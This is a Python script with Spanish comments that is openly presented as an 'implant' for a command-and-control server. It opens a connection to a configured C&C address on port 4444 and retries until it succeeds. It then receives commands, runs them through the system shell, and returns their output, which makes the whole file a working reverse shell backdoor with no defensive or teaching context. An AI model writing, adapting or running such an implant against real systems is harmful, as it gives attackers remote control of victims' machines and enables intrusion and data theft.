#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import subprocess
import os
import time

# Configuración del servidor C&C
IP_CNC = '192.168.1.100'  # Cambia esto a la IP del servidor C&C
PUERTO_CNC = 4444         # Puerto del servidor C&C

def conectar():
    """
    Establece conexión con el servidor C&C.
    """
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP_CNC, PUERTO_CNC))
            return s
        except Exception as e:
            print(f"[!] Error conectando al C&C: {e}")
            time.sleep(5)  # Reintentar cada 5 segundos

def shell(s):
    """
    Ejecuta comandos recibidos del servidor C&C.
    """
    while True:
        try:
            # Recibir comando del servidor
            comando = s.recv(1024).decode('utf-8').strip()
            
            if comando.lower() == 'exit':
                s.send(b'Salida del implant.\n')
                break

            # Ejecutar comando en el sistema
            resultado = subprocess.run(
                comando,
                shell=True,
                capture_output=True,
                text=True
            )

            # Enviar salida al servidor
            salida = resultado.stdout + resultado.stderr
            s.send(salida.encode('utf-8'))
        except Exception as e:
            error_msg = f"[!] Error ejecutando comando: {e}\n"
            s.send(error_msg.encode('utf-8'))

def main():
    """
    Flujo principal del implant.
    """
    s = conectar()
    shell(s)
    s.close()

if __name__ == "__main__":
    main()